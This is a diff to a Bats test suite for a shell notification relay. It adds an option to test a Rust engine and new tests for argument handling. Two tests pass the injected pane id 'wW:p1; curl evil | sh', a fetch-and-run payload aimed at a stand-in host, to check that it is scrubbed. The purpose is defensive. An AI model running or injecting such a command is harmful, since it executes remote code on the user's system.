@@ -10,7 +10,10 @@
 
 setup() {
   REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
-  RELAY="$REPO_ROOT/dot_local/libexec/pns/executable_relay.sh"
+  # PNS_RELAY_BIN points this suite at the Rust engine binary instead; the
+  # bash engine stays the default until R3d retires it. The same assertions
+  # against either engine is the R2d differential gate.
+  RELAY="${PNS_RELAY_BIN:-$REPO_ROOT/dot_local/libexec/pns/executable_relay.sh}"
   CHANNELS="$BATS_TEST_TMPDIR/channels"
   mkdir -p "$CHANNELS"
   # Stub channels record the event they were handed, then exit 0.
@@ -189,4 +192,36 @@ mode_of() { jq -r '.mode' <"$BATS_TEST_TMPDIR/$1.event"; }
     RELAY_MOSHI_VIEWING=1 RELAY_HERDR_FOCUSED_PANE=wW:p1 \
     "$RELAY" --agent claude --state done --detail x --pane wW:p1 >/dev/null 2>&1
   fired moshi
+}
+
+@test "a pane with shell metacharacters is scrubbed from every delivered event" {
+  relay --agent claude --state done --detail x --pane 'wW:p1; curl evil | sh'
+  fired macos-banner
+  run jq -r '.pane' "$BATS_TEST_TMPDIR/macos-banner.event"
+  [ "$output" = "" ]
+  grep -q 'dropped a pane id with shell metacharacters' "$BATS_TEST_TMPDIR/err"
+}
+
+@test "a scrub warning is not printed when no channel will run" {
+  relay --agent claude --state done --pane 'wW:p1; curl evil | sh' --local-only --remote-only
+  run grep -c 'dropped a pane id' "$BATS_TEST_TMPDIR/err"
+  [ "$output" = "0" ]
+}
+
+@test "a non-unicode argument never breaks the exit-0 edge" {
+  # The engine sits on an always-exit-0 path; a stray byte in argv must
+  # degrade like any unknown token, not abort the notification.
+  run env PNS_CHANNELS_DIR="$CHANNELS" RELAY_IDLE_SECS=99999 \
+    "$RELAY" $'\xff' --local-only --remote-only
+  [ "$status" -eq 0 ]
+  [[ "$output" == *SKIPPED* ]]
+}
+
+@test "the delivered event is newline-terminated for line-oriented channels" {
+  printf '#!/usr/bin/env bash\nset -e\nIFS= read -r event\nprintf %%s "$event" >"%s/line.event"\n' \
+    "$BATS_TEST_TMPDIR" >"$CHANNELS/hermes.sh"
+  chmod +x "$CHANNELS/hermes.sh"
+  relay --agent claude --state done --detail x
+  run jq -r '.agent' "$BATS_TEST_TMPDIR/line.event"
+  [ "$output" = "claude" ]
 }
